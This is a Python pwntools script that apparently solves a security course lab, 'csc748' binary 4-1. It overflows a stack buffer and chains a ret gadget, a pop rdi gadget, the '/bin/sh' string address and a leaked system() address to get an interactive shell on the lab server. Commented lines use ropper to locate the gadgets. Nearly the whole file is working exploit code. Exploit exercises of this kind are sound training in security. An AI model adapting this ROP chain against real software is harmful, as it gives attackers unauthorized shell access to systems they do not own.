''' Script Module Importing '''
from pwn import *
import subprocess

context.arch = "x86_64"             # Set Exploit Architecture to x86_64

''' Constant Initializing '''
BUFF_FILL = b"A"*40                             # Set Buffer Filler
POP_RDI = p64(0x401423)                         # Set Gadget Address
RET_NOP = p64(0x40101a)                         # Set RET Address
SHELL_ADDR = p64(0x4020d0)                      # Set Shell Parameter Address

''' Establish Connection '''
p = remote("csc748.hostbin.org", 7041)          # Test Script Against Server
# p = process("./4-1_lab.bin")                  # Test Script Locally
# p = gdb.debug("./4-1_lab.bin")                # Debug with GDB

''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
''' Step 1:  Pre-Exploit Analysis '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''

# ''' Use Hexdump to Analyze Output '''
# print("\n\n Output of hexdump:\n", '-' * 50)
# print(hexdump(p.read(1500)),'\n\n')
# 
# 
# ''' Define and Run Ropper Shell Commands '''
# ropper_pop = ["ropper", "--file", "4-1_lab.bin", "--search", "pop rdi; ret"]
# ropper_shell = ["ropper", "--file", "4-1_lab.bin", "--string", "/bin/sh"]
# 
# print(" Output of ropper --search pop rdi; ret:\n", '-' * 50)  # Separator
# print(subprocess.check_output(ropper_pop, text=True))
# 
# print("\n Output of ropper --string /bin/sh:\n", '-' * 50)
# print(subprocess.check_output(ropper_shell, text=True))


''' ' ' ' ' ' ' ' ' '''
''' Step 2: Exploit '''
''' ' ' ' ' ' ' ' ' '''

''' Obtain system() Address Pointer '''
p.readuntil(b'@ ')		                                # Wait for Program Output
pAddr = p.readuntil(b'\n').decode('utf-8').strip()      # Extract Address Pointer
pAddr_dec = int(pAddr, 16)                              # Convert Address to Decimal
print("\n\n {:>10}  0x{:<17} {:>}{:>}{:>} ".format(
    "system() Address:",
    pAddr,
    '(', pAddr_dec, ')'))                               # Format and Print

''' Prepare Payload '''
#
# Payload Format:
#   BUFF_FILL:     Filler junk
#   RET_NOP:       Pointer to 'ret' instruction, used to realign stack
#   POP_RDI:       Pointer to a 'pop rdi; ret' gadget to load RDI register
#   SHELL_ADDR:    Pointer to the string '/bin/sh/' for use as a parameter
#   pAddr_dec:     Pointer to the `system()` function in libc to execute '/bin/sh/'.
#
payload = BUFF_FILL + RET_NOP + POP_RDI + SHELL_ADDR + p64(pAddr_dec)

''' Overwrite the Stack '''
p.sendline(payload)         # Send the Payload

''' Exploit Server '''
p.interactive()             # Start Interactive Session